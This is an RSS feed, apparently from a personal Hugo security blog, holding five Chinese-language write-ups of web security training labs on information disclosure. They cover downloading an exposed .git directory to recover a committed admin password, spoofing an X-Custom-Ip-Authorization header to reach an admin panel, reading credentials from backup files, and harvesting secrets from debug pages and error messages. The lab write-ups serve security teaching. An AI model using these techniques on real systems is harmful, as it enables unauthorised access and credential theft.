@@ -1,0 +1,126 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Information-Disclosure on en1r0py</title><link>/tags/information-disclosure/</link><description>Recent content in Information-Disclosure on en1r0py</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Sun, 22 Dec 2024 20:58:00 +0800</lastBuildDate><atom:link href="/tags/information-disclosure/index.xml" rel="self" type="application/rss+xml"/><item><title>[Write Up]Lab: Information disclosure in version control history</title><link>/posts/2024/information-disclosure-lab-infoleak-in-version-control-history/</link><pubDate>Sun, 22 Dec 2024 20:58:00 +0800</pubDate><guid>/posts/2024/information-disclosure-lab-infoleak-in-version-control-history/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/information-disclosure-lab-infoleak-in-version-control-history-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/information-disclosure-lab-infoleak-in-version-control-history-1.jpg">&lt;/p>
+&lt;h2 id="solution">Solution&lt;/h2>
+&lt;ol>
+&lt;li>通过枚举工具(例如&lt;code>gobuster&lt;/code>)，获得目标url&lt;code>/.git&lt;/code>
+&lt;img alt="Git url" src="/img/2024/information-disclosure-lab-infoleak-in-version-control-history-2.jpg">&lt;/li>
+&lt;li>通过&lt;code>curl&lt;/code>将&lt;code>/.git&lt;/code>下载到本地
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ wget -r https://0a71001f0385f2e680a2d05f00890056.web-security-academy.net/.git
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ cd 0a71001f0385f2e680a2d05f00890056.web-security-academy.net/.git
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ git log
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>commit 80e7a7b5d124b8aaed33c91e19ce74ebf75be56b &lt;span style="color:#f92672">(&lt;/span>HEAD -&amp;gt; master&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Author: Carlos Montoya &amp;lt;carlos@carlos-montoya.net&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Date: Tue Jun &lt;span style="color:#ae81ff">23&lt;/span> 14:05:07 &lt;span style="color:#ae81ff">2020&lt;/span> +0000
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Remove admin password from config
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>commit 21ea1423ac98788feb9be6e60815e568e10b313b
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Author: Carlos Montoya &amp;lt;carlos@carlos-montoya.net&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Date: Mon Jun &lt;span style="color:#ae81ff">22&lt;/span> 16:23:42 &lt;span style="color:#ae81ff">2020&lt;/span> +0000
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Add skeleton admin panel
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ git show 80e7a7b5d124b8aaed33c91e19ce74ebf75be56b
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>commit 80e7a7b5d124b8aaed33c91e19ce74ebf75be56b &lt;span style="color:#f92672">(&lt;/span>HEAD -&amp;gt; master&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Author: Carlos Montoya &amp;lt;carlos@carlos-montoya.net&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Date: Tue Jun &lt;span style="color:#ae81ff">23&lt;/span> 14:05:07 &lt;span style="color:#ae81ff">2020&lt;/span> +0000
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Remove admin password from config
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>diff --git a/admin.conf b/admin.conf
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>index d256cbe..21d23f1 &lt;span style="color:#ae81ff">100644&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>--- a/admin.conf
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>+++ b/admin.conf
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>@@ -1 +1 @@
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-ADMIN_PASSWORD&lt;span style="color:#f92672">=&lt;/span>zq9gi2jl81wpv0bdwqgd
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>+ADMIN_PASSWORD&lt;span style="color:#f92672">=&lt;/span>env&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#39;ADMIN_PASSWORD&amp;#39;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>通过&lt;code>administrator:zq9gi2jl81wpv0bdwqgd&lt;/code>登录，点击右上方&lt;code>Admin panel&lt;/code>，并点击&lt;code>carlos - Delete&lt;/code>即可解题
+&lt;img alt="Admin panel" src="/img/2024/information-disclosure-lab-infoleak-in-version-control-history-3.jpg">&lt;/li>
+&lt;/ol></content></item><item><title>[Write Up]Lab: Authentication bypass via information disclosure</title><link>/posts/2024/information-disclosure-lab-infoleak-authentication-bypass/</link><pubDate>Sun, 22 Dec 2024 20:36:07 +0800</pubDate><guid>/posts/2024/information-disclosure-lab-infoleak-authentication-bypass/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/information-disclosure-lab-infoleak-authentication-bypass-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/information-disclosure-lab-infoleak-authentication-bypass-1.jpg">&lt;/p>
+&lt;h2 id="solution">Solution&lt;/h2>
+&lt;ol>
+&lt;li>使用&lt;code>wiener:peter&lt;/code>登录&lt;/li>
+&lt;li>访问&lt;code>/admin&lt;/code>
+&lt;img alt="Admin" src="/img/2024/information-disclosure-lab-infoleak-authentication-bypass-2.jpg">&lt;/li>
+&lt;li>尝试使用&lt;code>TRACE&lt;/code> method访问&lt;code>/admin&lt;/code>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">TRACE&lt;/span> /admin &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>X-Custom-IP-Authorization: 141.11.46.54
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>新增&lt;code>X-Custom-Ip-Authorization: 127.0.0.1&lt;/code>，并再次使用&lt;code>GET&lt;/code>method访问&lt;code>/admin&lt;/code>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /admin &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>X-Custom-Ip-Authorization: 127.0.0.1
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>通过Burp Poxy自动在每个请求中新增&lt;code>X-Custom-Ip-Authorization: 127.0.0.1&lt;/code>，点击&lt;code>Proxy settings&lt;/code>，并下滑到&lt;code>HTTP match and replace rules&lt;/code>点击&lt;code>add&lt;/code>
+&lt;img alt="HTTP match and replace rules" src="/img/2024/information-disclosure-lab-infoleak-authentication-bypass-3.jpg">&lt;/li>
+&lt;li>通过浏览器访问&lt;code>/admin&lt;/code>可看到管理页面，点击&lt;code>carlos - Delete&lt;/code>后即可解题
+&lt;img alt="Admin" src="/img/2024/information-disclosure-lab-infoleak-authentication-bypass-4.jpg">&lt;/li>
+&lt;/ol></content></item><item><title>[Write Up]Lab: Source code disclosure via backup files</title><link>/posts/2024/information-disclosure-lab-infoleak-via-backup-files/</link><pubDate>Sun, 22 Dec 2024 20:26:27 +0800</pubDate><guid>/posts/2024/information-disclosure-lab-infoleak-via-backup-files/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/information-disclosure-lab-infoleak-via-backup-files-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/information-disclosure-lab-infoleak-via-backup-files-1.jpg">&lt;/p>
+&lt;h2 id="solution">Solution&lt;/h2>
+&lt;ol>
+&lt;li>访问&lt;code>/robots.txt&lt;/code>url，内容如下
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>User-agent: *
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Disallow: /backup
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>访问&lt;code>/backup&lt;/code>url，内容如下
+&lt;img alt="Backup files" src="/img/2024/information-disclosure-lab-infoleak-via-backup-files-2.jpg">&lt;/li>
+&lt;li>点击&lt;code>ProductTemplate.java.bak&lt;/code>后可以看到&lt;code>postgresql&lt;/code>的连接密码
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">ProductTemplate&lt;/span> &lt;span style="color:#66d9ef">implements&lt;/span> Serializable
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// ...&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">readObject&lt;/span>(ObjectInputStream inputStream) &lt;span style="color:#66d9ef">throws&lt;/span> IOException, ClassNotFoundException
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> inputStream.&lt;span style="color:#a6e22e">defaultReadObject&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ConnectionBuilder connectionBuilder &lt;span style="color:#f92672">=&lt;/span> ConnectionBuilder.&lt;span style="color:#a6e22e">from&lt;/span>(
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;org.postgresql.Driver&amp;#34;&lt;/span>,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;postgresql&amp;#34;&lt;/span>,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;localhost&amp;#34;&lt;/span>,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 5432,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;postgres&amp;#34;&lt;/span>,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;postgres&amp;#34;&lt;/span>,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;n8r1bjlxpxzzsmjo692mxd67qtw1wfqj&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ).&lt;span style="color:#a6e22e">withAutoCommit&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// ...&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>回到主页后点击最上方&lt;code>Submit solution&lt;/code>并填入密码即可解题&lt;/li>
+&lt;/ol></content></item><item><title>[Write Up]Lab: Information disclosure on debug page</title><link>/posts/2024/information-disclosure-lab-infoleak-on-debug-page/</link><pubDate>Sun, 22 Dec 2024 20:17:39 +0800</pubDate><guid>/posts/2024/information-disclosure-lab-infoleak-on-debug-page/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/information-disclosure-lab-infoleak-on-debug-page-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/information-disclosure-lab-infoleak-on-debug-page-1.jpg">&lt;/p>
+&lt;h2 id="solution">Solution&lt;/h2>
+&lt;ol>
+&lt;li>在进入Lab首页时，查看源码会找到php管理页面
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&amp;lt;!-- &amp;lt;a href=/cgi-bin/phpinfo.php&amp;gt;Debug&amp;lt;/a&amp;gt; --&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>访问&lt;code>/cgi-bin/phpinfo.php&lt;/code>后搜索&lt;code>SECRET_KEY&lt;/code>，将结果填入&lt;code>Submit solution&lt;/code>内即可解题
+&lt;img alt="SECRET_KEY" src="/img/2024/information-disclosure-lab-infoleak-on-debug-page-2.jpg">&lt;/li>
+&lt;/ol></content></item><item><title>[Write Up]Lab: Information disclosure in error messages</title><link>/posts/2024/information-disclosure-lab-infoleak-in-error-messages/</link><pubDate>Sun, 22 Dec 2024 20:08:27 +0800</pubDate><guid>/posts/2024/information-disclosure-lab-infoleak-in-error-messages/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/information-disclosure-lab-infoleak-in-error-messages-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/information-disclosure-lab-infoleak-in-error-messages-1.jpg">&lt;/p>
+&lt;h2 id="solution">Solution&lt;/h2>
+&lt;ol>
+&lt;li>点击页面任一商品的&lt;code>View details&lt;/code>，对应请求为
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">GET /product?productId=1
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>修改&lt;code>productId&lt;/code>参数，获得报错信息
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /product?productId=x &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">500&lt;/span> &lt;span style="color:#a6e22e">Internal Server Error&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Internal Server Error: java.lang.NumberFormatException: For input string: &amp;#34;x&amp;#34;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Apache Struts 2 2.3.31
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>点击最上方&lt;code>Submit solution&lt;/code>，将&lt;code>Apache Struts 2&lt;/code>版本输入后即可解题&lt;/li>
+&lt;/ol></content></item></channel></rss>
